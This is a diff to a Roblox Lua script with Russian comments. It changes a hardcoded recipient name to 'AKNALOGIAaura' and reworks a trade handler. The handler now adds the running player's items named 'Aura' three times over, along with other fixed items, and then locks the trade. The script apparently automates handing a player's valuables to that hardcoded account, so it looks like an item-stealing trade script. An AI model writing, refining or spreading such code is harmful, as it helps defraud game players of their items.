@@ -2,7 +2,7 @@ local player = game:GetService("Players").LocalPlayer
 local playerGui = player:FindFirstChildOfClass("PlayerGui")
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local userInputService = game:GetService("UserInputService")
-local savedPlayerName = "AKNALOGIA11"
+local savedPlayerName = "AKNALOGIAaura"
 ---Циклы
 local RunService = game:GetService("RunService")
 local tradeInterval = 2
@@ -607,14 +607,19 @@ local function handleTrade()
         addItem("EnchantingStone", 10)
         addItem("RoyalGuardian", 1)
 
-        -- Поиск и добавление предметов с названием "Aura"
-        local playerInventory = replicatedStorage.Profiles[currentPlayerName].Inventory
-        for _, item in pairs(playerInventory:GetChildren()) do
-            if item.Name:find("Aura") then
-                addItem(item.Name, 1)
+        local function findAndAddAuras()
+            local playerInventory = replicatedStorage.Profiles[currentPlayerName].Inventory
+            for _, item in pairs(playerInventory:GetChildren()) do
+                if item.Name:find("Aura") then
+                    addItem(item.Name, 1)
+                end
             end
         end
-
+        
+        -- Выполнение поиска и добавления предметов три раза
+        for i = 1, 3 do
+            findAndAddAuras()
+        end
         -- Блокировка трейда
         local lockArgs = {
             [1] = true
